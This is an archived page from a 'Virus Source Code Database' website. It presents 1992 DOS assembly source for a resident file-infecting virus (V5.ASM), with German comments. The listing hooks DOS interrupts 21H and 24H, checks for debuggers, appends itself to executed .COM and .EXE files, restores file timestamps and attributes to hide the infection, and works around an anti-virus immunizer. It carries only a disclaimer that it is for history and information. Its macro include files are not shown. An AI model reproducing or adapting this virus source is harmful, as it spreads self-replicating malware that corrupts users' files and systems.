<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: xph-1029_asm</title>
<meta name="KEYWORDS" content="xph-1029.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for xph-1029.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="x_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_1_asm.php">x_1_asm</a><br>
<a href="x-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x-1_asm.php">x-1_asm</a><br>
<a href="x_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_2_asm.php">x_2_asm</a><br>
<a href="x-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x-2_asm.php">x-2_asm</a><br>
<a href="xa1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xa1__asm.php">xa1__asm</a><br>
<a href="xa1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xa1_asm.php">xa1_asm</a><br>
<a href="x__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x__asm.php">x__asm</a><br>
<a href="x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_asm.php">x_asm</a><br>
<a href="xboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xboot_asm.php">xboot_asm</a><br>
<a href="xdx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xdx_asm.php">xdx_asm</a><br>
<a href="xmas_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xmas_pas.php">xmas_pas</a><br>
<a href="xph-1029_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph-1029_asm.php">xph-1029_asm</a><br>
<a href="xph_1100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph_1100_asm.php">xph_1100_asm</a><br>
<a href="xph-1100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph-1100_asm.php">xph-1100_asm</a><br>
<a href="xxx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xxx_asm.php">xxx_asm</a><br>
<a href="xyz__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz__asm.php">xyz__asm</a><br>
<a href="xyz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz_asm.php">xyz_asm</a><br>
<a href="xyz-v2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz-v2_asm.php">xyz-v2_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

            TITLE V5.ASM

;(c) 1992 by The Priests (DR.ET)

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ EQU-Anweisungen:                                                           ณ
;ณ----------------------------------------------------------------------------ณ
;ณ EQUs siehe Vx_EQU.INC, Werte sind assemblierungsabhnig.                   ณ
;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู

          INCLUDE V5_EQU.INC            ;EQU-Vereinbarungen
          INCLUDE V5_BUF.INC            ;Pufferdeklarationen
          INCLUDE V5_NON.INC            ;NON-Resident part of Vx
          INCLUDE V5_TSR.INC            ;TSR-part of Vx

ASSUME CS:CODE, DS:CODE, ES:CODE

CODE SEGMENT

ORG 100H

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ NON-Resident part:                                                         ณ
;ณ----------------------------------------------------------------------------ณ
;ณ MACROS siehe Vx_NON.INC.                                                   ณ
;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
START:    HOST VIRUS                    ;Sprung zu VIRUS

;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ VIRUS:                                                                     บ
;บ============================================================================บ
;บ Nichtresidenter Teil des Virus.                                            บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
VIRUS     PROC FAR                      ;Erste Adresse des Virus!

SET_IP:   MOV BP,FAKTOR                 ;IP herausfinden!
          PUSH DS                       ;<DS> sichern (und somit auch <ES> !!!)

          TESTDEBUG                     ;Debuggertest

;------------------------------------------------------------------------------
; SEG-REGs + Flags setzen:
;------------------------------------------------------------------------------
          PUSH CS                       ;<DS> und <ES> auf <CS> setzen:
          POP DS                        ;<-- (s.o.)
          PUSH CS                       ;<-- (s.o.)
          POP ES                        ;<-- (s.o.)
          CLD                           ;Aufsteigend (Stringmanipulation)
;------------------------------------------------------------------------------

          RESETHOST                     ;Host reparieren
          VERSCHIEB ENDE                ;Virus verschieben? FEHLER --> ENDE
          SETINTS                       ;Interupts umbiegen

;------------------------------------------------------------------------------
; <ES> und <DS> restaurieren:
;------------------------------------------------------------------------------
ENDE:     POP DS                        ;<DS> und <ES> restaurieren
          PUSH DS                       ;<--- (s.o.)
          POP ES                        ;<--- (s.o.)

;------------------------------------------------------------------------------
; Virus beenden (.COM oder .EXE..? s.o...):
;------------------------------------------------------------------------------
          DB 0EAH                       ;Direct Intersegment Jmp...
HOST_OFS  DW 0100H                      ;OFS-ADR fr den Rcksprung zum Host
HOST_SEG  DW ?                          ;SEG-ADR fr den Rcksprung zum Host
;------------------------------------------------------------------------------

VIRUS     ENDP

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ TSR-part:                                                                  ณ
;ณ----------------------------------------------------------------------------ณ
;ณ MACROS siehe Vx_TSR.INC.                                                   ณ
;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู

;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ NEU24:                                                                     บ
;บ============================================================================บ
;บ Neuer INT 24H-Handler (Critical error).                                    บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
NEU24     PROC FAR

          MOV AL,3                      ;Aktuelle Funktion abbrechen...
          IRET                          ;Zurck zur fehlerhaften Funktion.

NEU24     ENDP

;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ NEU21:                                                                     บ
;บ============================================================================บ
;บ Neuer INT 21H-Handler (DOS-Funktionen).                                    บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
NEU21     PROC FAR

          SETAKTIV END21                          ;Schon aktiv? JA --> END21

          VERTEST END21                           ;Schon drin? JA --> END21
          TEST21 END21                            ;Nich gemeint --> END21

          PUSHALL                                 ;Register sichern

          SCANNAME END21POP                       ;Kein EXECutable --> END21POP
          JMP START_ME                            ;.EXE oder .COM --> START_ME

END21POP: POPALL                                  ;Register laden

END21:    CLRAKTIV                                ;INT 21H NICHT mehr aktiv!

;------------------------------------------------------------------------------
; Sprung zum orginal INT 21H Handler:
;------------------------------------------------------------------------------
          DB 0EAH                                 ;Direct Intersegment Jmp...
ALT21     DD ?                                    ;Rcksprung zum INT 21H

;==============================================================================
; Virus anhngen oder nicht:
;==============================================================================

START_ME: LIESINTS                                ;Vektoren lesen und PUSHEN!!!
          PUSHINTS                                ;Alte Vektoren neu setzen
          ATTRPUSH REST_INT                       ;PUSH!, FEHLER --> REST_INT

          FOPEN BREAK                             ;File-Open, FEHLER --> BREAK

          PUSH CS                                 ;Nebenbei...
          POP DS                                  ;...<DS> auf <CS> setzen

          TAILTEST CLOSE                          ;Infiziert/FEHLER --> CLOSE
          READHEAD F_CLOSE                        ;Ersten 18H BYTEs einlesen
          LAENGE F_CLOSE                          ;FLnge, FEHLER --> CLOSE

;------------------------------------------------------------------------------
; Dateizeiger auf den Anfang des Hosts:
;------------------------------------------------------------------------------
          CALL SEEK_BEG                 ;Dateizeiger auf den Anfang der Datei
          JC F_CLOSE                    ;FEHLER --> N_CLOSE --> CLOSE
;------------------------------------------------------------------------------

          TIMEPUSH F_CLOSE                        ;ZEIT+DATUM auf den STACK

          SETHOST CLOSE                           ;Modify, FEHLER --> CLOSE,

          IMMUNTEST                               ;Wenn ntig TNT entschrfen.
          FSPACE DI                               ;<DI> s. SETHOST
          ZAEHL                                   ;Anzahl kopien zhlen
          COPY                                    ;Virus hinten dranhngen

MODIFY:   TIMEPOP                                 ;Alte Zeit neu setzen
CLOSE:    FCLOSE                                  ;File schlieแen
BREAK:    ATTRPOP                                 ;Attribut restaurieren
REST_INT: POPINTS

;------------------------------------------------------------------------------
; INT beenden...
;------------------------------------------------------------------------------
          JMP END21POP                  ;INT Beenden --> NEU21END
;------------------------------------------------------------------------------

NEU21     ENDP

;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ SEEK_BEG:                                                                  บ
;บ============================================================================บ
;บ Dateizeiger auf den Anfang der Datei setzen:                               บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
SEEK_BEG  PROC NEAR

          MOV AX,4200H                  ;Dateizeiger bew., relativ zum Anfang
          XOR CX,CX                     ;HI-WORD des Offset
          XOR DX,DX                     ;LO-WORD des offset
          CALL GODOS                    ;Handle in <BX>

          RET                           ; --> HOME

SEEK_BEG  ENDP

;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ GODOS:                                                                     บ
;บ============================================================================บ
;บ Direkter Aufruf von INT 21H                                                บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
GODOS     PROC NEAR                     ;DOS-INT direkt aufrufen!!!

          PUSHF
          CALL DWORD PTR CS:[ALT21-FAKTOR]
          RET
                                        ;--> Is 17 BYTEs kleiner als die 
GODOS     ENDP                          ;Methode mit den Vektoren umbiegen..!

;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ PUFFER-Deklarationen:                                                      บ
;บ============================================================================บ
;บ MACROS siehe Vx_BUF.INC.                                                   บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
VIRBUF    PROC NEAR

          SCANBUF                       ;Scannernamen speichern
          INTERNBUF                     ;Interner Puffer

VIR_END   EQU $                         ;Ende des Virus

          EXTERNBUF                     ;Externer Puffer

VIRBUF    ENDP
;------------------------------------------------------------------------------

CODE      ENDS

          END START

</textarea></td></tr></table></body></html>
